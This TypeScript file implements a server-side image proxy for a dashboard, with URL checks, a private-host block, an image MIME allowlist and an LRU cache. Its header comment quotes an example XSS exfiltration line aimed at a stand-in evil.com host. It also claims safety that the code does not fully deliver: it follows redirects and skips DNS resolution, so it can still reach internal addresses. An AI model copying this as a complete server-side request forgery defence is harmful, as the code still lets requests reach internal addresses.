/**
 * Server-side image proxy for the dashboard.
 *
 * Goal: replace direct `<img src="https://avatar-host/x.png">` loads with
 * `<img src="/api/img-proxy?u=...">` so the dashboard's CSP can declare
 * `img-src 'self' data:` — closing the "future XSS exfiltrates via
 * `new Image().src = 'https://evil.com/?leak=...'`" channel.
 *
 * Safety:
 *   - Authenticated (gated by the standard /api/* session check).
 *   - Validates the upstream URL is https:// (no http: leaks of the
 *     dashboard's outbound IP via plaintext fetches).
 *   - Refuses private / loopback / link-local / CGNAT targets (reuses
 *     the same address-family check as the nsite resolver).
 *   - Per-image size cap (5 MiB).
 *   - Fetch timeout (5 s).
 *   - Content-Type must start with `image/` AND be in the small
 *     allowlist below — refuses HTML, JSON, octet-stream, etc.
 *     (Defense against an attacker who controls a server and tries
 *     to return non-image bytes that the browser might still render.)
 *
 * Caching:
 *   - In-memory LRU keyed by SHA-256 of the URL.
 *   - 256 entries, 7-day TTL — avatars rarely change.
 *   - Browser-side Cache-Control: max-age=604800, immutable so repeat
 *     loads of the same URL don't re-hit the proxy.
 *
 * Not in scope: full Blossom-style content addressing (the proxy
 * caches by URL, not by content hash, because the URL is what the
 * `<img>` tag has). That's fine — the cache key is salt-mixed with a
 * per-process random so dashboard restarts get a fresh cache without
 * confusing entries from a different machine identity.
 */

import http from 'http';
import crypto from 'crypto';

const ALLOWED_MIMES = new Set([
  'image/png',
  'image/jpeg',
  'image/webp',
  'image/gif',
  'image/svg+xml',
  'image/avif',
]);

const MAX_BYTES   = 5 * 1024 * 1024;
const FETCH_TIMEOUT_MS = 5_000;
const CACHE_MAX   = 256;
const CACHE_TTL_MS = 7 * 24 * 60 * 60 * 1000;

interface CacheEntry {
  bytes:       Uint8Array;
  contentType: string;
  fetchedAt:   number;
}

const cache = new Map<string, CacheEntry>();
const cacheSalt = crypto.randomBytes(16).toString('hex');

function cacheKey(url: string): string {
  return crypto.createHash('sha256').update(cacheSalt + url).digest('hex');
}

// Mirrors isPrivateOrLoopbackHost in nsite-resolver.ts. Inlined to keep
// the proxy module self-contained and avoid a coupling between the
// dashboard layer and the nsite resolution layer.
function isPrivateOrLoopbackHost(host: string): boolean {
  if (!host) return false;
  const h = host.replace(/^\[|\]$/g, '').toLowerCase();
  if (h === '::1') return true;
  if (h === '::')  return true;
  if (h.startsWith('fe80:')) return true;
  if (h.startsWith('fc') || h.startsWith('fd')) return true;
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const [a, b] = [parseInt(m[1]), parseInt(m[2])];
    if (a === 127) return true;
    if (a === 10)  return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 169 && b === 254) return true;
    if (a === 100 && b >= 64 && b <= 127) return true;
    if (a === 0)   return true;
  }
  return false;
}

function pruneCache(): void {
  const now = Date.now();
  for (const [k, v] of cache) {
    if (now - v.fetchedAt > CACHE_TTL_MS) cache.delete(k);
  }
  while (cache.size > CACHE_MAX) {
    // Map iteration order is insertion order — delete oldest first.
    const oldest = cache.keys().next().value;
    if (oldest === undefined) break;
    cache.delete(oldest);
  }
}

export async function handleImgProxy(
  req: http.IncomingMessage,
  res: http.ServerResponse,
): Promise<void> {
  const url = req.url || '';
  const q = url.indexOf('?');
  const params = q >= 0 ? new URLSearchParams(url.slice(q + 1)) : new URLSearchParams();
  const u = params.get('u') || '';

  if (!u) {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'u (url) parameter required' }));
    return;
  }

  let parsed: URL;
  try { parsed = new URL(u); }
  catch {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'invalid URL' }));
    return;
  }
  if (parsed.protocol !== 'https:') {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'https:// required' }));
    return;
  }
  if (isPrivateOrLoopbackHost(parsed.hostname)) {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'private/loopback target refused' }));
    return;
  }

  // Cache hit?
  const key = cacheKey(u);
  const hit = cache.get(key);
  if (hit && (Date.now() - hit.fetchedAt) < CACHE_TTL_MS) {
    // Re-insert to refresh LRU position.
    cache.delete(key);
    cache.set(key, hit);
    res.writeHead(200, {
      'Content-Type':   hit.contentType,
      'Content-Length': String(hit.bytes.byteLength),
      'Cache-Control':  'public, max-age=604800, immutable',
      'X-Img-Proxy':    'hit',
    });
    res.end(Buffer.from(hit.bytes));
    return;
  }

  // Cache miss — fetch upstream.
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), FETCH_TIMEOUT_MS);
  let upstream: Response;
  try {
    upstream = await fetch(u, {
      signal: ctl.signal,
      redirect: 'follow',  // image CDNs commonly redirect; safe because we
                           // SHA-discard non-image responses below
    });
  } catch (e: any) {
    clearTimeout(timer);
    res.writeHead(502, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: `upstream fetch failed: ${e?.message || e}` }));
    return;
  }
  clearTimeout(timer);

  if (!upstream.ok) {
    res.writeHead(upstream.status, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: `upstream HTTP ${upstream.status}` }));
    return;
  }

  const ct = (upstream.headers.get('content-type') || '').toLowerCase().split(';')[0].trim();
  if (!ALLOWED_MIMES.has(ct)) {
    res.writeHead(415, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: `content-type "${ct}" not in image allowlist` }));
    return;
  }

  // Size guard: read into a buffer with the cap. ArrayBuffer-based
  // because we want a hard limit; streaming with backpressure could be
  // added later if a real perf need shows up.
  const cl = upstream.headers.get('content-length');
  if (cl && Number(cl) > MAX_BYTES) {
    res.writeHead(413, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: `upstream content-length ${cl} exceeds ${MAX_BYTES}` }));
    return;
  }
  const ab = await upstream.arrayBuffer();
  if (ab.byteLength > MAX_BYTES) {
    res.writeHead(413, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: `upstream body ${ab.byteLength} exceeds ${MAX_BYTES}` }));
    return;
  }
  const bytes = new Uint8Array(ab);

  // Insert into cache (after pruning so we don't exceed the cap).
  pruneCache();
  cache.set(key, { bytes, contentType: ct, fetchedAt: Date.now() });

  res.writeHead(200, {
    'Content-Type':   ct,
    'Content-Length': String(bytes.byteLength),
    'Cache-Control':  'public, max-age=604800, immutable',
    'X-Img-Proxy':    'miss',
  });
  res.end(Buffer.from(bytes));
}
